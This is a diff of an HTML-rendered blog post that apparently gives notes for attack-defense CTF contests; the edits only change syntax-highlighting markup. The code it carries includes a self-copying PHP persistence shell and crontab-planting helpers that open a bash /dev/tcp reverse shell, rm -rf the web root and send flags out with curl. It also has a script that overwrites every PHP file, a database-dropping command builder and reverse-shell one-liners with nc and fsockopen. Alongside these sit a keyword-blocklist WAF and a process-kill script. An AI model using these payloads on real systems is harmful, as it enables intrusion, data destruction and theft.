@@ -105,7 +105,7 @@
     <span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
     <span class="nb">ignore_user_abort</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
     <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
-        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nx">randstr</span><span class="p">()</span><span class="o">.</span><span class="s1">'.php'</span><span class="p">,</span><span class="nx">file_get_content</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nf">randstr</span><span class="p">()</span><span class="mf">.</span><span class="s1">'.php'</span><span class="p">,</span><span class="nf">file_get_content</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
         <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"http://127.0.0.1/"</span><span class="p">);</span>
     <span class="p">}</span>
 <span class="cp">?&gt;</span>
@@ -138,18 +138,18 @@
 
 <span class="k">def</span> <span class="nf">crontab_reverse</span><span class="p">(</span><span class="n">reverse_ip</span><span class="p">,</span> <span class="n">reverse_port</span><span class="p">):</span>
     <span class="n">crontab_path</span> <span class="o">=</span> <span class="s">"/tmp"</span>
-    <span class="n">cmd</span> <span class="o">=</span> <span class="s">'bash -i &gt;&amp; /dev/tcp/</span><span class="si">%</span><span class="s">s/</span><span class="si">%</span><span class="s">d 0&gt;&amp;1'</span> <span class="o">%</span> <span class="p">(</span><span class="n">reverse_ip</span><span class="p">,</span> <span class="n">reverse_port</span><span class="p">)</span>
-    <span class="n">crontab_cmd</span> <span class="o">=</span> <span class="s">"* * * * * bash -c '</span><span class="si">%</span><span class="s">s'</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="n">cmd</span>
-    <span class="n">encode_crontab_cmd</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">crontab_cmd</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s">'bash -i &gt;&amp; /dev/tcp/%s/%d 0&gt;&amp;1'</span> <span class="o">%</span> <span class="p">(</span><span class="n">reverse_ip</span><span class="p">,</span> <span class="n">reverse_port</span><span class="p">)</span>
+    <span class="n">crontab_cmd</span> <span class="o">=</span> <span class="s">"* * * * * bash -c '%s'</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="n">cmd</span>
+    <span class="n">encode_crontab_cmd</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">crontab_cmd</span><span class="p">)</span>
     <span class="n">cmd</span> <span class="o">=</span> <span class="s">"/bin/echo "</span> <span class="o">+</span> <span class="n">encode_crontab_cmd</span> <span class="o">+</span> <span class="s">" | /usr/bin/base64 -d | /bin/cat &gt;&gt; "</span> <span class="o">+</span> <span class="n">crontab_path</span> <span class="o">+</span> <span class="s">"/tmp_rev.conf"</span> <span class="o">+</span> <span class="s">" ; "</span> <span class="o">+</span> <span class="s">"/usr/bin/crontab "</span> <span class="o">+</span> <span class="n">crontab_path</span> <span class="o">+</span> <span class="s">"/tmp.conf"</span>
     <span class="k">return</span> <span class="n">cmd</span>
 
 
 <span class="k">def</span> <span class="nf">crontab_rm</span><span class="p">(</span><span class="n">rm_paths</span><span class="o">=</span><span class="s">'/var/www/html/'</span><span class="p">):</span>
     <span class="n">crontab_path</span> <span class="o">=</span> <span class="s">"/tmp"</span>
-    <span class="n">cmd</span> <span class="o">=</span> <span class="s">'/bin/rm -rf </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">rm_paths</span>
-    <span class="n">crontab_cmd</span> <span class="o">=</span> <span class="s">"* * * * * </span><span class="si">%</span><span class="s">s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="n">cmd</span>
-    <span class="n">encode_crontab_cmd</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">crontab_cmd</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s">'/bin/rm -rf %s'</span> <span class="o">%</span> <span class="n">rm_paths</span>
+    <span class="n">crontab_cmd</span> <span class="o">=</span> <span class="s">"* * * * * %s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="n">cmd</span>
+    <span class="n">encode_crontab_cmd</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">crontab_cmd</span><span class="p">)</span>
     <span class="n">cmd</span> <span class="o">=</span> <span class="s">"/bin/echo "</span> <span class="o">+</span> <span class="n">encode_crontab_cmd</span> <span class="o">+</span> <span class="s">" | /usr/bin/base64 -d | /bin/cat &gt;&gt; "</span> <span class="o">+</span> <span class="n">crontab_path</span> <span class="o">+</span> <span class="s">"/tmp_rm.conf"</span> <span class="o">+</span> <span class="s">" ; "</span> <span class="o">+</span> <span class="s">"/usr/bin/crontab "</span> <span class="o">+</span> <span class="n">crontab_path</span> <span class="o">+</span> <span class="s">"/tmp.conf"</span>
     <span class="k">return</span> <span class="n">cmd</span>
 
@@ -157,10 +157,10 @@
 <span class="k">def</span> <span class="nf">crontab_flag_submit</span><span class="p">(</span><span class="n">flag_server</span><span class="p">,</span> <span class="n">flag_port</span><span class="p">,</span> <span class="n">flag_api</span><span class="p">,</span> <span class="n">flag_token</span><span class="p">,</span>
                         <span class="n">flag_host</span><span class="p">):</span>
     <span class="n">crontab_path</span> <span class="o">=</span> <span class="s">'/tmp'</span>
-    <span class="n">cmd</span> <span class="o">=</span> <span class="s">'/usr/bin/curl "http://</span><span class="si">%</span><span class="s">s:</span><span class="si">%</span><span class="s">s/</span><span class="si">%</span><span class="s">s" -d "token=</span><span class="si">%</span><span class="s">s&amp;flag=$(curl </span><span class="si">%</span><span class="s">s)" '</span> <span class="o">%</span> <span class="p">(</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s">'/usr/bin/curl "http://%s:%s/%s" -d "token=%s&amp;flag=$(curl %s)" '</span> <span class="o">%</span> <span class="p">(</span>
         <span class="n">flag_server</span><span class="p">,</span> <span class="n">flag_port</span><span class="p">,</span> <span class="n">flag_api</span><span class="p">,</span> <span class="n">flag_token</span><span class="p">,</span> <span class="n">flag_host</span><span class="p">)</span>
-    <span class="n">crontab_cmd</span> <span class="o">=</span> <span class="s">"* * * * * </span><span class="si">%</span><span class="s">s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="n">cmd</span>
-    <span class="n">encode_crontab_cmd</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">crontab_cmd</span><span class="p">)</span>
+    <span class="n">crontab_cmd</span> <span class="o">=</span> <span class="s">"* * * * * %s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="n">cmd</span>
+    <span class="n">encode_crontab_cmd</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">crontab_cmd</span><span class="p">)</span>
     <span class="n">cmd</span> <span class="o">=</span> <span class="s">"/bin/echo "</span> <span class="o">+</span> <span class="n">encode_crontab_cmd</span> <span class="o">+</span> <span class="s">" | /usr/bin/base64 -d | /bin/cat &gt;&gt; "</span> <span class="o">+</span> <span class="n">crontab_path</span> <span class="o">+</span> <span class="s">"/tmp_submit.conf"</span> <span class="o">+</span> <span class="s">" ; "</span> <span class="o">+</span> <span class="s">"/usr/bin/crontab "</span> <span class="o">+</span> <span class="n">crontab_path</span> <span class="o">+</span> <span class="s">"/tmp.conf"</span>
     <span class="k">return</span> <span class="n">cmd</span>
 
@@ -199,17 +199,17 @@
     <span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
     <span class="nb">ignore_user_abort</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
     <span class="nb">unlink</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
-    <span class="k">function</span> <span class="nf">getfiles</span><span class="p">(</span><span class="nv">$path</span><span class="p">){</span>
+    <span class="k">function</span> <span class="n">getfiles</span><span class="p">(</span><span class="nv">$path</span><span class="p">){</span>
         <span class="k">foreach</span><span class="p">(</span><span class="nb">glob</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$afile</span><span class="p">){</span>
             <span class="k">if</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$afile</span><span class="p">))</span>
-                <span class="nx">getfiles</span><span class="p">(</span><span class="nv">$afile</span><span class="o">.</span><span class="s1">'/*.php'</span><span class="p">);</span>
+                <span class="nf">getfiles</span><span class="p">(</span><span class="nv">$afile</span><span class="mf">.</span><span class="s1">'/*.php'</span><span class="p">);</span>
             <span class="k">else</span>
                 <span class="o">@</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$afile</span><span class="p">,</span><span class="s2">"#Anything#"</span><span class="p">);</span>
                 <span class="c1">//unlink($afile);</span>
         <span class="p">}</span>
     <span class="p">}</span>
     <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
-        <span class="nx">getfiles</span><span class="p">(</span><span class="nx">__DIR__</span><span class="p">);</span>
+        <span class="nf">getfiles</span><span class="p">(</span><span class="k">__DIR__</span><span class="p">);</span>
         <span class="nb">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
     <span class="p">}</span>
 <span class="cp">?&gt;</span>
@@ -230,10 +230,10 @@
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
 </span><span class="kn">import</span> <span class="nn">base64</span>
 <span class="k">def</span> <span class="nf">rm_db</span><span class="p">(</span><span class="n">db_user</span><span class="p">,</span><span class="n">my_db_passwd</span><span class="p">):</span>
-    <span class="n">cmd</span> <span class="o">=</span> <span class="s">"/usr/bin/mysql -h localhost -u</span><span class="si">%</span><span class="s">s </span><span class="si">%</span><span class="s">s -e '"</span><span class="o">%</span><span class="p">(</span><span class="n">db_user</span><span class="p">,</span><span class="n">my_db_passwd</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s">"/usr/bin/mysql -h localhost -u%s %s -e '"</span><span class="o">%</span><span class="p">(</span><span class="n">db_user</span><span class="p">,</span><span class="n">my_db_passwd</span><span class="p">)</span>
     <span class="n">db_name</span> <span class="o">=</span> <span class="p">[</span><span class="s">'performance_schema'</span><span class="p">,</span><span class="s">'mysql'</span><span class="p">,</span><span class="s">'flag'</span><span class="p">]</span>
     <span class="k">for</span> <span class="n">db</span> <span class="ow">in</span> <span class="n">db_name</span><span class="p">:</span>
-        <span class="n">cmd</span> <span class="o">+=</span> <span class="s">"drop database </span><span class="si">%</span><span class="s">s;"</span><span class="o">%</span><span class="n">db</span>
+        <span class="n">cmd</span> <span class="o">+=</span> <span class="s">"drop database %s;"</span><span class="o">%</span><span class="n">db</span>
     <span class="n">cmd</span> <span class="o">+=</span> <span class="s">"'"</span>
     <span class="k">return</span> <span class="n">cmd</span>  
 </code></pre></div></div>
@@ -275,14 +275,14 @@ socat <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty,stderr
   <p>php</p>
 </blockquote>
 
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">'$sock=fsockopen("your_ip","4444");exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">php</span> <span class="o">-</span><span class="n">r</span> <span class="s1">'$sock=fsockopen("your_ip","4444");exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
 </code></pre></div></div>
 
 <blockquote>
   <p>windows</p>
 </blockquote>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">nc.exe</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">/bin/bash</span><span class="w"> </span><span class="nx">1.3.3.7</span><span class="w"> </span><span class="nx">4444</span><span class="w">
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nc.exe</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">/bin/bash</span><span class="w"> </span><span class="nx">1.3.3.7</span><span class="w"> </span><span class="nx">4444</span><span class="w">
 </span></code></pre></div></div>
 
 <p>  看到这么多罪恶的脚本心里好受了许多</p>
@@ -327,9 +327,9 @@ socat <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty,stderr
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
 <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 <span class="nb">define</span><span class="p">(</span><span class="s1">'LOG_FILENAME'</span><span class="p">,</span> <span class="s1">'log.txt'</span><span class="p">);</span>
-<span class="k">function</span> <span class="nf">waf</span><span class="p">()</span> <span class="p">{</span>
+<span class="k">function</span> <span class="n">waf</span><span class="p">()</span> <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'getallheaders'</span><span class="p">))</span> <span class="p">{</span>
-        <span class="k">function</span> <span class="nf">getallheaders</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">function</span> <span class="n">getallheaders</span><span class="p">()</span> <span class="p">{</span>
             <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_SERVER</span> <span class="k">as</span> <span class="nv">$name</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                 <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="s1">'HTTP_'</span><span class="p">)</span> <span class="nv">$headers</span><span class="p">[</span><span class="nb">str_replace</span><span class="p">(</span><span class="s1">' '</span><span class="p">,</span> <span class="s1">'-'</span><span class="p">,</span> <span class="nb">ucwords</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span><span class="s1">'_'</span><span class="p">,</span> <span class="s1">' '</span><span class="p">,</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="mi">5</span><span class="p">)))))</span> <span class="p">]</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
             <span class="p">}</span>
@@ -349,7 +349,7 @@ socat <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty,stderr
         <span class="nv">$files</span><span class="p">[</span><span class="nv">$key</span><span class="p">][</span><span class="s1">'content'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="nv">$key</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">]);</span>
         <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="nv">$key</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="s2">"virink"</span><span class="p">);</span>
     <span class="p">}</span>
-    <span class="nb">unset</span><span class="p">(</span><span class="nv">$header</span><span class="p">[</span><span class="s1">'Accept'</span><span class="p">]);</span> <span class="c1">//fix a bug</span>
+    <span class="k">unset</span><span class="p">(</span><span class="nv">$header</span><span class="p">[</span><span class="s1">'Accept'</span><span class="p">]);</span> <span class="c1">//fix a bug</span>
     <span class="nv">$input</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
         <span class="s2">"Get"</span> <span class="o">=&gt;</span> <span class="nv">$get</span><span class="p">,</span>
         <span class="s2">"Post"</span> <span class="o">=&gt;</span> <span class="nv">$post</span><span class="p">,</span>
@@ -359,9 +359,9 @@ socat <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty,stderr
     <span class="p">);</span>
     <span class="c1">//deal with</span>
     <span class="nv">$pattern</span> <span class="o">=</span> <span class="s2">"select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex"</span><span class="p">;</span>
-    <span class="nv">$pattern</span><span class="o">.=</span> <span class="s2">"|file_put_contents|fwrite|curl|system|eval|assert|crontab|base64"</span><span class="p">;</span>
-    <span class="nv">$pattern</span><span class="o">.=</span> <span class="s2">"|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore"</span><span class="p">;</span>
-    <span class="nv">$pattern</span><span class="o">.=</span> <span class="s2">"|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec"</span><span class="p">;</span>
+    <span class="nv">$pattern</span><span class="mf">.</span><span class="o">=</span> <span class="s2">"|file_put_contents|fwrite|curl|system|eval|assert|crontab|base64"</span><span class="p">;</span>
+    <span class="nv">$pattern</span><span class="mf">.</span><span class="o">=</span> <span class="s2">"|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore"</span><span class="p">;</span>
+    <span class="nv">$pattern</span><span class="mf">.</span><span class="o">=</span> <span class="s2">"|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec"</span><span class="p">;</span>
     <span class="nv">$vpattern</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"|"</span><span class="p">,</span> <span class="nv">$pattern</span><span class="p">);</span>
     <span class="nv">$bool</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$input</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
@@ -369,7 +369,7 @@ socat <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty,stderr
             <span class="k">foreach</span> <span class="p">(</span><span class="nv">$v</span> <span class="k">as</span> <span class="nv">$kk</span> <span class="o">=&gt;</span> <span class="nv">$vv</span><span class="p">)</span> <span class="p">{</span>
                 <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/</span><span class="nv">$value</span><span class="s2">/i"</span><span class="p">,</span> <span class="nv">$vv</span><span class="p">))</span> <span class="p">{</span>
                     <span class="nv">$bool</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
-                    <span class="nx">logging</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
+                    <span class="nf">logging</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
                     <span class="k">break</span><span class="p">;</span>
                 <span class="p">}</span>
             <span class="p">}</span>
@@ -378,11 +378,11 @@ socat <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty,stderr
         <span class="k">if</span> <span class="p">(</span><span class="nv">$bool</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
     <span class="p">}</span>
 <span class="p">}</span>
-<span class="k">function</span> <span class="nf">logging</span><span class="p">(</span><span class="nv">$var</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nx">LOG_FILENAME</span><span class="p">,</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span> <span class="o">.</span> <span class="nb">time</span><span class="p">()</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span> <span class="o">.</span> <span class="nb">print_r</span><span class="p">(</span><span class="nv">$var</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span> <span class="p">,</span> <span class="nx">FILE_APPEND</span><span class="p">);</span>
+<span class="k">function</span> <span class="n">logging</span><span class="p">(</span><span class="nv">$var</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">file_put_contents</span><span class="p">(</span><span class="no">LOG_FILENAME</span><span class="p">,</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span> <span class="mf">.</span> <span class="nb">time</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span> <span class="mf">.</span> <span class="nb">print_r</span><span class="p">(</span><span class="nv">$var</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span> <span class="p">,</span> <span class="no">FILE_APPEND</span><span class="p">);</span>
     <span class="c1">// die() or unset($_GET) or unset($_POST) or unset($_COOKIE);</span>
 <span class="p">}</span>
-<span class="nx">waf</span><span class="p">();</span>
+<span class="nf">waf</span><span class="p">();</span>
 <span class="cp">?&gt;</span>
 </code></pre></div></div>
 
@@ -400,7 +400,7 @@ socat <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty,stderr
 </ol>
 
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env sh</span>
-<span class="nx">ps</span> <span class="o">-</span><span class="nx">aux</span><span class="o">|</span><span class="nx">grep</span> <span class="s1">'www-data'</span><span class="o">|</span><span class="nx">awk</span> <span class="s1">'{print $2}'</span><span class="o">|</span><span class="nx">xargs</span> <span class="nx">kill</span> <span class="o">-</span><span class="mi">9</span>
+<span class="n">ps</span> <span class="o">-</span><span class="n">aux</span><span class="o">|</span><span class="n">grep</span> <span class="s1">'www-data'</span><span class="o">|</span><span class="n">awk</span> <span class="s1">'{print $2}'</span><span class="o">|</span><span class="n">xargs</span> <span class="n">kill</span> <span class="o">-</span><span class="mi">9</span>
 </code></pre></div></div>
 
 <h3 id="总结">总结</h3>
